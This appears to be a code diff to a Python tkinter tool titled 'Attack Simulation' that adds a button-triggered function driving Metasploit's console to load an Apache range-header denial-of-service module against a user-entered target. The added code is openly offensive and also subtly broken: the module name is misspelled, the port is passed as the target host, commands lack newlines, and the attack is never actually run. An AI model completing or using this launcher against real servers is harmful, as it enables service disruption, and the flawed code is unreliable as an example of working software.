@@ -1,7 +1,10 @@
+#!/usr/bin/python3
 import tkinter as tk
 from tkinter import messagebox
 import subprocess
 from PIL import Image, ImageTk
+from subprocess import Popen, PIPE, STDOUT
+import time
 
 def check_reachability():
     target_ip = target_ip_entry.get()
@@ -15,6 +18,16 @@ def check_reachability():
         messagebox.showinfo("Success", f"Successfully connected to target {target_ip}.")
     else:
         messagebox.showerror("Error", f"Target IP {target_ip} is not reachable. Check your netork connection.")
+
+def dos_exploit(port=80):
+	p = Popen(['msfconsole', ''], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
+	print("Starting msfconsole...")
+	time.sleep(10) 
+	p.stdin.write(b'use auxillary/dos/http/apache_range_dos')
+	# msf_stdout = 
+	p.stdin.write(f"set RHOST {port}")
+	#print(msf_stdout.decode())
+	return
 
 root = tk.Tk()
 root.title("Attack Simulation")
@@ -55,7 +68,7 @@ check_button.place(x=455,y=90)
 
 button_active_bg, button_active_fg = '#f00', '#fff'
 
-print_b = tk.Button(root, text="Exploit",  relief='groove', cursor='hand2', activebackground=button_active_bg, activeforeground=button_active_fg)
+print_b = tk.Button(root, text="Exploit",  relief='groove', cursor='hand2', activebackground=button_active_bg, activeforeground=button_active_fg, command=dos_exploit)
 print_b.place(x=235, y=90)
 
 #exit
